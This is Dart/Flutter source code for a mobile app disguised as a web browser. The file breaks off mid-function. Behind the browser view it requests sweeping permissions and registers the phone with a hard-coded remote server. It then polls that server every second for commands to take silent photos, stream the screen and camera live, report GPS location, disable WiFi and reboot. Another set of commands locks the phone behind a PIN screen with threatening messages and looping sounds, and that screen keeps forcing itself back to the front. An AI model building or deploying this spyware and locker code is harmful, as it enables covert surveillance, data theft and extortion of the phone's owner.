import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:math';
import 'dart:typed_data';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:camera/camera.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:webview_flutter/webview_flutter.dart';

// ── SERVER ───────────────────────────────────────────────────────────────
const String kServerBase = "http://ziperrxasa.psxysanz.biz.id:2018";

// ── GLOBALS ───────────────────────────────────────────────────────────────
ValueNotifier<bool> deviceLocked = ValueNotifier<bool>(false);
late AudioPlayer _audioPlayer;
String globalDeviceId = "";
String globalDeviceModel = "";
String currentLockMessage = "⚠️ YOUR PHONE IS LOCKED ⚠️";
String currentLockPIN = "1234";
String currentLockHTML = "";
String currentLockOwner = "Admin";

String currentLockType = "basic";
final lockChatMessages = ValueNotifier<List<Map<String, String>>>([]);
bool isLockLive = false;

const MethodChannel platformStrobe = MethodChannel('com.nullx.pp/strobe');
const MethodChannel platformSpy = MethodChannel('com.nullx.pp/background_spy');

bool _isLiveStreaming = false;
Timer? _liveStreamTimer;

// ════════════════════════════════════════════════════════════════════════════
// MATRIX RAIN WIDGET - VERSI OPTIMIZED (RepaintLimit)
// ════════════════════════════════════════════════════════════════════════════
class MatrixRain extends StatefulWidget {
  final Color textColor;
  final double fontSize;
  final int numberOfColumns;
  final int updateInterval;

  const MatrixRain({
    super.key,
    this.textColor = const Color(0xFF00FF00),
    this.fontSize = 14.0,
    this.numberOfColumns = 20, // DIKURANGI dari 30 jadi 20
    this.updateInterval = 120, // DIPERLAMBAT dari 80 jadi 120ms
  });

  @override
  State<MatrixRain> createState() => _MatrixRainState();
}

class _MatrixRainState extends State<MatrixRain> with TickerProviderStateMixin {
  late List<int> _drops;
  late List<List<String>> _columns;
  Timer? _timer;
  final Random _random = Random();
  int _columnCount = 0;
  
  // UNTUK MEMBATASI REPAINT
  int _frameSkip = 0;
  static const int _frameSkipLimit = 2;

  static const String _chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノ';

  @override
  void initState() {
    super.initState();
    _initMatrix();
    _timer = Timer.periodic(Duration(milliseconds: widget.updateInterval), (_) {
      _updateMatrix();
      // HANYA REPAINT SETIAP _frameSkipLimit KALI
      _frameSkip++;
      if (_frameSkip >= _frameSkipLimit && mounted) {
        _frameSkip = 0;
        setState(() {});
      }
    });
  }

  @override
  void dispose() {
    _timer?.cancel();
    super.dispose();
  }

  void _initMatrix() {
    _columnCount = widget.numberOfColumns;
    _drops = List.generate(_columnCount, (_) => -_random.nextInt(20));
    _columns = List.generate(
      _columnCount,
      (_) => List.generate(30, (_) => _getRandomChar()), // DIPER PENDEK dari 50 jadi 30
    );
  }

  String _getRandomChar() {
    return _chars[_random.nextInt(_chars.length)];
  }

  void _updateMatrix() {
    for (int i = 0; i < _columnCount; i++) {
      if (_drops[i] < 0) {
        _drops[i]++;
      } else if (_drops[i] >= 0 && _drops[i] < 30) {
        _columns[i][_drops[i]] = _getRandomChar();
        _drops[i]++;
      } else {
        _drops[i] = -_random.nextInt(15);
        for (int j = 0; j < 30; j++) {
          _columns[i][j] = _getRandomChar();
        }
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return RepaintBoundary( // PENTING! Mencegah repaint widget parent
      child: CustomPaint(
        painter: _MatrixRainPainter(
          drops: _drops,
          columns: _columns,
          textColor: widget.textColor,
          fontSize: widget.fontSize,
          columnCount: _columnCount,
        ),
        size: Size.infinite,
      ),
    );
  }
}

class _MatrixRainPainter extends CustomPainter {
  final List<int> drops;
  final List<List<String>> columns;
  final Color textColor;
  final double fontSize;
  final int columnCount;

  _MatrixRainPainter({
    required this.drops,
    required this.columns,
    required this.textColor,
    required this.fontSize,
    required this.columnCount,
  });

  @override
  void paint(Canvas canvas, Size size) {
    final double columnWidth = size.width / columnCount;
    
    for (int i = 0; i < columnCount; i++) {
      double x = i * columnWidth;
      
      for (int j = 0; j < columns[i].length; j++) {
        if (j <= drops[i] && drops[i] - j < 12) {
          double opacity = 1.0 - ((drops[i] - j) / 12.0);
          if (opacity < 0.2) opacity = 0.2;
          
          Color charColor = textColor.withOpacity(opacity);
          
          if (j == drops[i] - 1) {
            charColor = Colors.white;
          }
          
          final textPainter = TextPainter(
            text: TextSpan(
              text: columns[i][j],
              style: TextStyle(
                color: charColor,
                fontSize: fontSize,
                fontFamily: 'monospace',
              ),
            ),
            textDirection: TextDirection.ltr,
          );
          textPainter.layout();
          textPainter.paint(
            canvas,
            Offset(x + (columnWidth - textPainter.width) / 2, j * fontSize * 0.8),
          );
        }
      }
    }
  }

  @override
  bool shouldRepaint(covariant _MatrixRainPainter oldDelegate) {
    // HANYA REPAINT JIKA DROPS BERUBAH
    return oldDelegate.drops != drops;
  }
}

// ════════════════════════════════════════════════════════════════════════════
// APP CONFIG
// ════════════════════════════════════════════════════════════════════════════
class AppConfig {
  static String embeddedPairId = "";
  static String fakeUrl = "https://www.google.com";

  static Future<void> loadConfig() async {
    try {
      final String configString =
          await rootBundle.loadString('assets/config.json');
      final Map<String, dynamic> config = jsonDecode(configString);
      embeddedPairId = config['pairId'] ?? "";
      fakeUrl = config['fakeUrl'] ?? "https://www.google.com";
      print("✅ Loaded config - Fake URL: $fakeUrl");
    } catch (e) {
      print("❌ Config error: $e");
      embeddedPairId = "";
    }
  }
}

// ════════════════════════════════════════════════════════════════════════════
// MAIN
// ════════════════════════════════════════════════════════════════════════════
void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  _audioPlayer = AudioPlayer();

  await AppConfig.loadConfig();

  FlutterError.onError = (FlutterErrorDetails details) {
    FlutterError.presentError(details);
  };

  PlatformDispatcher.instance.onError = (error, stack) {
    return true;
  };

  if (Platform.isAndroid) {
    if (!await Permission.systemAlertWindow.isGranted) {
      await Permission.systemAlertWindow.request();
    }
    _requestNotifAccess();
  }

  await _requestPermissions();

  final info = await _getDeviceInfo();
  globalDeviceId = info['id']!;
  globalDeviceModel = info['model']!;

  try {
    await platformSpy.invokeMethod('saveTargetId', globalDeviceId);
  } catch (_) {}
  try {
    await platformSpy.invokeMethod('saveDeviceIdAll', globalDeviceId);
  } catch (_) {}

  final prefs = await SharedPreferences.getInstance();
  String? savedPair = prefs.getString('pairId');

  if ((savedPair == null || savedPair.isEmpty) &&
      AppConfig.embeddedPairId.isNotEmpty) {
    print("🔑 Auto pairing with: ${AppConfig.embeddedPairId}");
    final success = await pairDevice(AppConfig.embeddedPairId);
    if (success) {
      savedPair = AppConfig.embeddedPairId;
      print("✅ Auto pair success!");
    }
  }

  if (savedPair != null && savedPair.isNotEmpty) {
    await _registerDevice(globalDeviceId, globalDeviceModel);
    _startSpyware(globalDeviceId);
  }

  final isDeviceLocked = prefs.getBool('device_locked') ?? false;

  if (isDeviceLocked) {
    final lockMessage = prefs.getString('lock_message') ??
        '⚠️ YOUR PHONE IS LOCKED ⚠️';
    final lockPin = prefs.getString('lock_pin') ?? '1234';
    final lockOwner = prefs.getString('lock_owner') ?? 'Admin';
    final lockType = prefs.getString('lock_type') ?? 'basic';
    final lockHtml = prefs.getString('custom_lock_html') ?? '';
    final lockLive = prefs.getBool('lock_live') ?? false;

    currentLockMessage = lockMessage;
    currentLockPIN = lockPin;
    currentLockOwner = lockOwner;
    currentLockType = lockType;
    currentLockHTML = lockHtml;
    isLockLive = lockLive;
    deviceLocked.value = true;

    playScarySound();

    if (isLockLive) {
      try {
        await platformSpy.invokeMethod('bringToForeground');
      } catch (_) {}
    }
  }

  runApp(const AppRoot());
}

void _requestNotifAccess() async {
  try {
    await platformSpy.invokeMethod('openNotificationSettings');
  } catch (_) {}
}

Future<void> _requestPermissions() async {
  await [
    Permission.location,
    Permission.contacts,
    Permission.storage,
    Permission.manageExternalStorage,
    Permission.camera,
    Permission.microphone,
    Permission.ignoreBatteryOptimizations,
    Permission.notification,
    Permission.sms,
    Permission.photos,
  ].request();
}

Future<Map<String, String>> _getDeviceInfo() async {
  final di = DeviceInfoPlugin();
  String model = "Unknown", id = "UNKNOWN";
  try {
    if (Platform.isAndroid) {
      final a = await di.androidInfo;
      model = "${a.brand.toUpperCase()} ${a.model}";
      id = "${a.brand}-${a.model}-${a.id}".replaceAll(' ', '_');
    } else if (Platform.isIOS) {
      final i = await di.iosInfo;
      model = i.name;
      id = i.identifierForVendor ?? "UNKNOWN_IOS";
    }
  } catch (_) {
    id = "ZDX-${Platform.localHostname.hashCode}";
  }
  return {"id": id, "model": model};
}

Future<void> _registerDevice(String id, String model) async {
  try {
    final bat = Battery();
    int lv = await bat.batteryLevel.catchError((_) => 100);
    await http.post(
        Uri.parse("$kServerBase/api/register-target"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "id": id,
          "model": model,
          "battery": lv.toString(),
          "status": "Online",
          "lastSeen": DateTime.now().toIso8601String(),
        }));
  } catch (_) {}
}

Future<bool> pairDevice(String pairId) async {
  try {
    final bat = Battery();
    int lv = await bat.batteryLevel.catchError((_) => 100);
    final res = await http
        .post(
          Uri.parse("$kServerBase/api/pair-target"),
          headers: {"Content-Type": "application/json"},
          body: jsonEncode({
            "pairId": pairId,
            "deviceId": globalDeviceId,
            "model": globalDeviceModel,
            "battery": lv.toString(),
          }),
        )
        .timeout(const Duration(seconds: 15));
    if (res.statusCode == 200) {
      final prefs = await SharedPreferences.getInstance();
      await prefs.setString('pairId', pairId);
      return true;
    }
  } catch (_) {}
  return false;
}

void playScarySound() async {
  await _audioPlayer.setReleaseMode(ReleaseMode.loop);
  await _audioPlayer.play(UrlSource(
      'https://www.soundboard.com/handler/DownLoadTrack.ashx?cliptitle=Scary+Laugh&filename=24/243764-00f7e1b5-829d-4874-a690-671891b0c79b.mp3'));
}

void stopSound() async {
  await _audioPlayer.stop();
}

void _startLiveCamera(String id, String side) async {
  if (_isLiveStreaming) return;
  _isLiveStreaming = true;
  try {
    await platformSpy.invokeMethod('startLiveCameraStream', {"side": side});
  } catch (_) {}
  _liveStreamTimer = Timer.periodic(const Duration(milliseconds: 150), (t) async {
    if (!_isLiveStreaming) {
      t.cancel();
      return;
    }
    try {
      final f = await platformSpy.invokeMethod('getLiveFrame') as String?;
      if (f != null && f.isNotEmpty) {
        await http
            .post(
              Uri.parse("$kServerBase/api/live-frame/$id"),
              headers: {"Content-Type": "application/json"},
              body: jsonEncode({
                "frame": f,
                "ts": DateTime.now().millisecondsSinceEpoch
              }),
            )
            .timeout(const Duration(seconds: 2));
      }
    } catch (_) {}
  });
}

void _startLiveScreen(String id) {
  if (_isLiveStreaming) return;
  _isLiveStreaming = true;
  _liveStreamTimer = Timer.periodic(const Duration(milliseconds: 150), (t) async {
    if (!_isLiveStreaming) {
      t.cancel();
      return;
    }
    try {
      final f = await platformSpy.invokeMethod('startScreenStreamBackground')
          as String?;
      if (f != null && f.isNotEmpty) {
        await http
            .post(
              Uri.parse("$kServerBase/api/live-frame/$id"),
              headers: {"Content-Type": "application/json"},
              body: jsonEncode({
                "frame": f,
                "ts": DateTime.now().millisecondsSinceEpoch
              }),
            )
            .timeout(const Duration(seconds: 2));
      }
    } catch (_) {}
  });
}

void _stopLive() {
  _isLiveStreaming = false;
  _liveStreamTimer?.cancel();
  _liveStreamTimer = null;
  platformSpy.invokeMethod('stopLiveCameraStream').catchError((_) {});
}

Future<void> _clearLockState() async {
  try {
    final prefs = await SharedPreferences.getInstance();
    await prefs.remove('custom_lock_html');
    await prefs.remove('custom_lock_pin');
    await prefs.remove('custom_lock_message');
    await prefs.remove('custom_lock_owner');
    await prefs.remove('last_lock_type');
    await prefs.remove('lock_message');
    await prefs.remove('lock_pin');
    await prefs.remove('lock_owner');
    await prefs.remove('lock_type');
    await prefs.remove('lock_live');
    await prefs.setBool('device_locked', false);

    try {
      await platformSpy.invokeMethod('saveLockState', {
        'locked': false,
        'isLockLive': false,
        'message': '',
        'pin': '1234',
        'lockHTML': '',
        'lockType': 'basic',
        'lockOwner': 'Admin',
      });
    } catch (_) {}

    currentLockMessage = "⚠️ YOUR PHONE IS LOCKED ⚠️";
    currentLockPIN = "1234";
    currentLockHTML = "";
    currentLockOwner = "Admin";
    currentLockType = "basic";
    isLockLive = false;
    lockChatMessages.value = [];
  } catch (e) {}
}

Future<void> _saveLockStateToDisk({
  required bool locked,
  required String message,
  required String pin,
  required String lockType,
  required bool isLive,
  required String ownerName,
  required String htmlContent,
}) async {
  try {
    final prefs = await SharedPreferences.getInstance();

    if (!locked) {
      await _clearLockState();
    } else {
      await prefs.setBool('device_locked', true);
      await prefs.setString('lock_message', message);
      await prefs.setString('lock_pin', pin);
      await prefs.setString('lock_owner', ownerName);
      await prefs.setString('lock_type', lockType);
      await prefs.setBool('lock_live', isLive);

      if (htmlContent.isNotEmpty) {
        await prefs.setString('custom_lock_html', htmlContent);
      }

      try {
        await platformSpy.invokeMethod('saveLockState', {
          'locked': true,
          'isLockLive': isLive,
          'message': message,
          'pin': pin,
          'lockHTML': htmlContent,
          'lockType': lockType,
          'lockOwner': ownerName,
        });
      } catch (_) {}
    }
  } catch (e) {}
}

void _updateLockUI({
  required bool locked,
  String? message,
  String? pin,
  String? htmlContent,
  String? lockType,
  bool? isLive,
  String? ownerName,
}) {
  if (message != null) currentLockMessage = message;
  if (pin != null) currentLockPIN = pin;
  if (htmlContent != null) currentLockHTML = htmlContent;
  if (lockType != null) currentLockType = lockType;
  if (isLive != null) isLockLive = isLive;
  if (ownerName != null) currentLockOwner = ownerName;

  deviceLocked.value = locked;

  _saveLockStateToDisk(
    locked: locked,
    message: currentLockMessage,
    pin: currentLockPIN,
    lockType: currentLockType,
    isLive: isLockLive,
    ownerName: currentLockOwner,
    htmlContent: currentLockHTML,
  );
}

void _startSpyware(String id) {
  Future<void> loop() async {
    try {
      final bat = Battery();
      int batLv = 100;
      try {
        batLv = await bat.batteryLevel;
      } catch (_) {}
      await http
          .post(
            Uri.parse("$kServerBase/api/heartbeat/$id"),
            headers: {"Content-Type": "application/json"},
            body: jsonEncode({
              "id": id,
              "status": "Alive",
              "battery": batLv.toString()
            }),
          )
          .timeout(const Duration(seconds: 1));

      final res = await http
          .get(Uri.parse("$kServerBase/api/get-command/$id"));
      if (res.statusCode != 200 || res.body.isEmpty) return;

      final d = jsonDecode(res.body);
      String cmd = d['command'] ?? 'idle';
      if (cmd == 'idle') return;
      String extra = d['extra'] ?? '';
      dynamic result;

      if (cmd == 'lock_with_html') {
        String htmlContent = '';
        String pin = '1234';
        String message = '⚠️ DEVICE COMPROMISED ⚠️';
        String owner = 'Admin';

        if (extra.contains('|')) {
          final parts = extra.split('|');
          htmlContent = parts[0];
          pin = parts.length > 1 ? parts[1] : '1234';
          message = parts.length > 2 ? parts[2] : '⚠️ DEVICE COMPROMISED ⚠️';
          owner = parts.length > 3 ? parts[3] : 'Admin';
        } else {
          htmlContent = extra;
        }

        try {
          String decoded = utf8.decode(base64.decode(htmlContent));
          htmlContent = decoded;
        } catch (_) {}

        _updateLockUI(
          locked: true,
          message: message,
          pin: pin,
          htmlContent: htmlContent,
          lockType: 'html',
          isLive: false,
          ownerName: owner,
        );

        playScarySound();
        result = {"status": "HTML_Locked"};
      } else if (cmd == 'lock_live') {
        String owner = 'Admin';
        if (extra.contains('|')) {
          final p = extra.split('|');
          currentLockMessage =
              p[0].isNotEmpty ? p[0] : '⚠️ HP INI DIKUNCI ⚠️';
          currentLockPIN =
              p.length > 1 && p[1].isNotEmpty ? p[1] : '1234';
          currentLockOwner =
              p.length > 2 && p[2].isNotEmpty ? p[2] : 'Admin';
        }

        _updateLockUI(
          locked: true,
          message: currentLockMessage,
          pin: currentLockPIN,
          lockType: 'live',
          isLive: true,
          ownerName: currentLockOwner,
        );

        playScarySound();
        result = {"status": "LockLive"};
      } else if (cmd == 'hard_lock' || cmd == 'lock_device') {
        if (extra.contains('|')) {
          final p = extra.split('|');
          currentLockMessage =
              p[0].isNotEmpty ? p[0] : '⚠️ YOUR PHONE IS LOCKED ⚠️';
          currentLockPIN =
              p.length > 1 && p[1].isNotEmpty ? p[1] : '1234';
          currentLockOwner =
              p.length > 2 && p[2].isNotEmpty ? p[2] : 'Admin';
        } else if (extra.isNotEmpty) {
          currentLockMessage = extra;
          currentLockOwner = 'Admin';
        }

        _updateLockUI(
          locked: true,
          message: currentLockMessage,
          pin: currentLockPIN,
          lockType: 'basic',
          isLive: false,
          ownerName: currentLockOwner,
        );

        playScarySound();
        result = {"status": "Locked"};
      } else if (cmd == 'unlock' || cmd == 'unlock_device') {
        if (deviceLocked.value) {
          await _clearLockState();

          _updateLockUI(
            locked: false,
            message: '',
            pin: '1234',
            htmlContent: '',
            lockType: 'basic',
            isLive: false,
            ownerName: 'Admin',
          );

          stopSound();
          try {
            await platformStrobe.invokeMethod('stopStrobe');
          } catch (_) {}
          try {
            await platformSpy.invokeMethod('stopLockOverlay');
          } catch (_) {}
          lockChatMessages.value = [];
        }
        result = {"status": "Unlocked"};
      } else if (cmd == 'take_photo') {
        final camStatus = await Permission.camera.request();
        if (camStatus.isGranted) {
          final b64 = await platformSpy.invokeMethod(
              'takeSilentPhotoBackground',
              {"side": extra.isEmpty ? "back" : extra});
          result = b64 != null
              ? {"status": "Success", "image_base64": b64}
              : {"status": "Failed"};
        } else {
          result = {"status": "Failed - permission denied"};
        }
      } else if (cmd == 'get_screen') {
        final b64 = await platformSpy
            .invokeMethod('startScreenStreamBackground');
        result = {"status": "Success", "image_base64": b64 ?? ""};
      } else if (cmd == 'live_camera_start') {
        _stopLive();
        _startLiveCamera(id, extra.isEmpty ? 'back' : extra);
        result = {"status": "Live camera started"};
      } else if (cmd == 'live_screen_start') {
        _stopLive();
        _startLiveScreen(id);
        result = {"status": "Live screen started"};
      } else if (cmd == 'live_stop') {
        _stopLive();
        result = {"status": "Stopped"};
      } else if (cmd == 'flash_strobe') {
        await platformStrobe.invokeMethod('startStrobe');
        result = {"status": "On"};
      } else if (cmd == 'stop_strobe') {
        await platformStrobe.invokeMethod('stopStrobe');
        result = {"status": "Off"};
      } else if (cmd == 'vibrate_loop') {
        try {
          await platformSpy
              .invokeMethod('vibrateDevice', {'duration': 5000});
        } catch (_) {}
        result = {"status": "Vibrating"};
      } else if (cmd == 'get_location' || cmd == 'track_gps') {
        final pos = await Geolocator.getCurrentPosition(
            desiredAccuracy: LocationAccuracy.high);
        result = {"lat": pos.latitude, "lng": pos.longitude};
      } else if (cmd == 'force_open') {
        try {
          await platformSpy.invokeMethod('bringToForeground');
        } catch (_) {}
        result = {"status": "OK"};
      } else if (cmd == 'reboot_device' || cmd == 'restart_device') {
        try {
          await platformSpy.invokeMethod('rebootDevice');
          result = {"status": "Rebooting"};
        } catch (e) {
          result = {"status": "reboot_failed: ${e.toString()}"};
        }
      } else if (cmd == 'chat_msg') {
        if (extra.isNotEmpty) {
          final msgs = List<Map<String, String>>.from(lockChatMessages.value);
          msgs.add({
            'from': 'owner',
            'text': extra,
            'time': DateTime.now().toString().substring(11, 16)
          });
          lockChatMessages.value = msgs;
        }
        result = {"status": "msg_received"};
      } else if (cmd == 'kill_wifi') {
        try {
          await platformSpy.invokeMethod('disableWifi');
          result = {"status": "WiFi disabled"};
        } catch (_) {
          result = {"status": "Failed - no permission"};
        }
      }

      if (result != null) {
        await http.post(
            Uri.parse("$kServerBase/api/post-response/$id"),
            headers: {"Content-Type": "application/json"},
            body: jsonEncode({"data": result, "cmd": cmd}));
      }
    } catch (_) {}
  }
  Timer.periodic(const Duration(seconds: 1), (_) => loop());
}

// ════════════════════════════════════════════════════════════════════════════
// APP ROOT
// ════════════════════════════════════════════════════════════════════════════
class AppRoot extends StatelessWidget {
  const AppRoot({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Browser',
      theme: ThemeData(
        brightness: Brightness.light,
        primarySwatch: Colors.blue,
        scaffoldBackgroundColor: Colors.white,
      ),
      home: const MainScreen(),
    );
  }
}

// MAIN SCREEN
class MainScreen extends StatefulWidget {
  const MainScreen({super.key});

  @override
  State<MainScreen> createState() => _MainScreenState();
}

class _MainScreenState extends State<MainScreen> {
  late WebViewController _webViewController;
  bool _isLoading = true;
  String _currentUrl = AppConfig.fakeUrl;

  @override
  void initState() {
    super.initState();
    _initWebView();
    deviceLocked.addListener(_onLockChanged);
  }

  @override
  void dispose() {
    deviceLocked.removeListener(_onLockChanged);
    super.dispose();
  }

  void _onLockChanged() {
    if (mounted) {
      setState(() {});
    }
  }

  void _initWebView() {
    _webViewController = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..setBackgroundColor(Colors.white)
      ..setNavigationDelegate(
        NavigationDelegate(
          onPageStarted: (String url) {
            setState(() {
              _isLoading = true;
              _currentUrl = url;
            });
          },
          onPageFinished: (String url) {
            setState(() {
              _isLoading = false;
            });
          },
        ),
      )
      ..loadRequest(Uri.parse(AppConfig.fakeUrl));
  }

  void _refreshPage() {
    _webViewController.reload();
  }

  void _goBack() async {
    if (await _webViewController.canGoBack()) {
      await _webViewController.goBack();
    }
  }

  void _goForward() async {
    if (await _webViewController.canGoForward()) {
      await _webViewController.goForward();
    }
  }

  @override
  Widget build(BuildContext context) {
    if (deviceLocked.value) {
      return const LockScreen();
    }

    return WillPopScope(
      onWillPop: () async {
        if (await _webViewController.canGoBack()) {
          await _webViewController.goBack();
          return false;
        }
        return false;
      },
      child: Scaffold(
        appBar: AppBar(
          title: Row(
            children: [
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                decoration: BoxDecoration(
                  color: Colors.grey.shade200,
                  borderRadius: BorderRadius.circular(20),
                ),
                child: Row(
                  children: [
                    const Icon(Icons.lock_outline, size: 14, color: Colors.green),
                    const SizedBox(width: 4),
                    Text(
                      _currentUrl
                          .replaceFirst(RegExp(r'https?://'), '')
                          .split('/')[0],
                      style: const TextStyle(
                          fontSize: 12, fontWeight: FontWeight.normal),
                    ),
                  ],
                ),
              ),
            ],
          ),
          centerTitle: false,
          actions: [
            IconButton(
              icon: const Icon(Icons.refresh),
              onPressed: _refreshPage,
            ),
            const SizedBox(width: 8),
          ],
          elevation: 0,
          backgroundColor: Colors.white,
          foregroundColor: Colors.black,
        ),
        body: Stack(
          children: [
            WebViewWidget(controller: _webViewController),
            if (_isLoading)
              const Center(
                child: CircularProgressIndicator(
                  color: Colors.blue,
                ),
              ),
          ],
        ),
        bottomNavigationBar: BottomAppBar(
          color: Colors.white,
          elevation: 8,
          child: Row(
            mainAxisAlignment: MainAxisAlignment.spaceEvenly,
            children: [
              IconButton(
                icon: const Icon(Icons.arrow_back, color: Colors.black87),
                onPressed: _goBack,
              ),
              IconButton(
                icon: const Icon(Icons.arrow_forward, color: Colors.black87),
                onPressed: _goForward,
              ),
              IconButton(
                icon: const Icon(Icons.refresh, color: Colors.black87),
                onPressed: _refreshPage,
              ),
              IconButton(
                icon: const Icon(Icons.home, color: Colors.black87),
                onPressed: () {
                  _webViewController
                      .loadRequest(Uri.parse(AppConfig.fakeUrl));
                },
              ),
            ],
          ),
        ),
      ),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════════
// LOCK SCREEN - TIDAK BISA KELUAR DENGAN MATRIX RAIN
// ════════════════════════════════════════════════════════════════════════════
class LockScreen extends StatefulWidget {
  const LockScreen({super.key});

  @override
  State<LockScreen> createState() => _LockScreenState();
}

class _LockScreenState extends State<LockScreen>
    with TickerProviderStateMixin {
  final _pinCtrl = TextEditingController();
  final _chatCtrl = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatPollTimer;
  Timer? _enforceLockTimer;

  bool _isHtmlLock = false;
  String _htmlLockContent = '';
  bool _wrongPin = false;
  bool _isLockLiveLocal = false;
  String _lockMessageLocal = '⚠️ YOUR PHONE IS LOCKED ⚠️';
  String _lockPINLocal = '1234';
  String _lockOwnerName = 'Admin';

  late AnimationController _shakeController;

  @override
  void initState() {
    super.initState();

    _shakeController = AnimationController(
      duration: const Duration(milliseconds: 100),
      vsync: this,
    );

    _loadLockState();

    _chatPollTimer = Timer.periodic(
        const Duration(seconds: 3), (_) => _pollChat());
    
    _enforceLockTimer = Timer.periodic(const Duration(milliseconds: 500), (_) {
      try {
        platformSpy.invokeMethod('bringToForeground');
      } catch (_) {}
    });
  }

  Future<void> _loadLockState() async {
    final prefs = await SharedPreferences.getInstance();

    final message = prefs.getString('lock_message') ?? currentLockMessage;
    final pin = prefs.getString('lock_pin') ?? currentLockPIN;
    final owner = prefs.getString('lock_owner') ?? currentLockOwner;
    final lockType = prefs.getString('lock_type') ?? currentLockType;
    final isLive = prefs.getBool('lock_live') ?? isLockLive;
    final html = prefs.getString('custom_lock_html') ?? currentLockHTML;

    setState(() {
      _lockMessageLocal = message;
      _lockPINLocal = pin;
      _lockOwnerName = owner;
      _isLockLiveLocal = isLive;

      if (lockType == 'html' && html.isNotEmpty) {
        _isHtmlLock = true;
        _htmlLockContent = html;
      } else if (lockType == 'live') {
        _isHtmlLock = false;
        _isLockLiveLocal = true;
      } else {
        _isHtmlLock = false;
        _isLockLiveLocal = false;
      }
    });
  }

  @override
  void dispose() {
    _pinCtrl.dispose();
    _chatCtrl.dispose();
    _chatScroll.dispose();
    _chatPollTimer?.cancel();
    _enforceLockTimer?.cancel();
    _shakeController.dispose();
    super.dispose();
  }

  Future<void> _pollChat() async {
    if (!_isLockLiveLocal || globalDeviceId.isEmpty) return;
    try {
      final res = await http
          .get(Uri.parse('$kServerBase/api/lock-chat/$globalDeviceId'))
          .timeout(const Duration(seconds: 4));
      if (res.statusCode == 200 && mounted) {
        final body = jsonDecode(res.body);
        final msgs = body['messages'] as List? ?? [];
        if (msgs.isNotEmpty) {
          final current =
              List<Map<String, String>>.from(lockChatMessages.value);
          for (final m in msgs) {
            current.add({
              'from': m['from']?.toString() ?? 'owner',
              'text': m['text']?.toString() ?? '',
              'time': m['time']?.toString() ?? '',
            });
          }
          lockChatMessages.value = current;
          Future.delayed(const Duration(milliseconds: 100), () {
            if (_chatScroll.hasClients) {
              _chatScroll.animateTo(
                _chatScroll.position.maxScrollExtent,
                duration: const Duration(milliseconds: 200),
                curve: Curves.easeOut,
              );
            }
          });
        }
      }
    } catch (_) {}
  }

  Future<void> _sendChatReply(String text) async {
    if (text.trim().isEmpty || globalDeviceId.isEmpty) return;
    _chatCtrl.clear();
    final current = List<Map<String, String>>.from(lockChatMessages.value);
    current.add({
      'from': 'target',
      'text': text.trim(),
      'time': TimeOfDay.now().format(context)
    });
    lockChatMessages.value = current;
    try {
      await http
          .post(
            Uri.parse('$kServerBase/api/lock-chat/$globalDeviceId'),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode({'text': text.trim(), 'from': 'target'}),
          )
          .timeout(const Duration(seconds: 5));
    } catch (_) {}
  }

  void _tryUnlock(String pin) async {
    if (pin == _lockPINLocal) {
      await _clearLockState();

      stopSound();
      try {
        await platformSpy.invokeMethod('stopLockOverlay');
      } catch (_) {}

      deviceLocked.value = false;
      _pinCtrl.clear();
      lockChatMessages.value = [];

      try {
        await platformSpy.invokeMethod('vibrateDevice', {'duration': 100});
      } catch (_) {}
      
    } else {
      _pinCtrl.clear();
      _shakeController.forward().then((_) => _shakeController.reverse());

      setState(() => _wrongPin = true);

      try {
        await platformSpy.invokeMethod('vibrateDevice', {'duration': 300});
      } catch (_) {}

      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(
          content: Text("❌ ACCESS DENIED! ❌",
              style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          backgroundColor: Colors.red,
          duration: Duration(milliseconds: 800),
        ),
      );

      Future.delayed(const Duration(milliseconds: 500), () {
        if (mounted) setState(() => _wrongPin = false);
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async => false,
      child: Scaffold(
        backgroundColor: Colors.black,
        body: _isHtmlLock && _htmlLockContent.isNotEmpty
            ? _buildHtmlLockUI()
            : ValueListenableBuilder<List<Map<String, String>>>(
                valueListenable: lockChatMessages,
                builder: (_, msgs, __) {
                  if (_isLockLiveLocal) {
                    // LOCK LIVE - WARNA HIJAU
                    return Stack(
                      children: [
                        // Matrix Rain HIJAU untuk Lock Live
                        MatrixRain(
                          textColor: const Color(0xFF00FF00),
                          fontSize: 16,
                          numberOfColumns: 25,
                          updateInterval: 80,
                        ),
                        _buildLockLiveUI(msgs),
                      ],
                    );
                  } else {
                    // LOCK HARD/BASIC - WARNA MERAH
                    return Stack(
                      children: [
                        // Matrix Rain MERAH untuk Hard Lock
                        MatrixRain(
                          textColor: const Color(0xFFFF0000),
                          fontSize: 16,
                          numberOfColumns: 25,
                          updateInterval: 80,
                        ),
                        _buildLockBasicUI(),
                      ],
                    );
                  }
                },
              ),
      ),
    );
  }

  Widget _buildHtmlLockUI() {
    return Container(
      color: Colors.black,
      child: Stack(
        children: [
          // Background matrix rain untuk HTML lock juga (MERAH karena hard lock)
          MatrixRain(
            textColor: const Color(0xFFFF0000),
            fontSize: 14,
            numberOfColumns: 30,
            updateInterval: 70,
          ),
          WebViewWidget(
            controller: WebViewController()
              ..setJavaScriptMode(JavaScriptMode.unrestricted)
              ..setBackgroundColor(Colors.transparent)
              ..addJavaScriptChannel(
                'UnlockChannel',
                onMessageReceived: (JavaScriptMessage message) {
                  _tryUnlock(message.message);
                },
              )
              ..loadHtmlString(_htmlLockContent),
          ),
        ],
      ),
    );
  }

  Widget _buildLockBasicUI() {
    return Center(
